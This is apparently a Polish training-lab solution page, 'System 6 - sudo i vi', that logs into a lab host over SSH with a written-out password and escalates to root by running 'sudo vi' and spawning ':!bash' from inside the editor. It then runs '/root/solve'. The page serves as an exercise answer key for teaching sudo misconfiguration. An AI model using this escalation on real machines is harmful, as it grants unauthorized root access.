---
title: "7.9 - System 6 - sudo i vi"
order: 9
---

> **Uwaga do rozwiązania:** `sudo vi` wykonujesz w powłoce. Polecenie `:!bash` wpisujesz dopiero wewnątrz edytora vi, bez komentarza.

```bash
ssh system6@192.168.100.107 -p 2206 # hasło: pjatk
sudo -l
sudo vi
```

W edytorze vi wpisz:

```text
:!bash
```

W otwartej powłoce roota uruchom:

```bash
/root/solve
```
